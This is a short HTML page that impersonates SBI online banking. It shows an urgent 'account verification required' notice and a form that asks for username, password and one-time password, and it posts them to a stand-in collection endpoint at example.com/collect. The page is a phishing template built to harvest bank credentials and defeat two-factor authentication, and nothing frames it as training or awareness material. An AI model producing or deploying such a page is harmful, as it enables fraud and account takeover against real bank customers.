<!DOCTYPE html>
<html>
<head>
    <title>SBI Online Banking Verification</title>
</head>

<body>

    <h1>SBI Online Banking</h1>

    <h2>Account Verification Required</h2>

    <p>
        Your account requires verification.
        Please login and verify your account to continue.
    </p>

    <form action="https://example.com/collect" method="POST">

        <label>Username:</label>
        <input type="text" name="username">

        <br><br>

        <label>Password:</label>
        <input type="password" name="password">

        <br><br>

        <label>OTP:</label>
        <input type="text" name="otp">

        <br><br>

        <button type="button">Verify Account</button>

    </form>

    <p>
        Enter your account details and OTP for verification.
    </p>

</body>
</html>
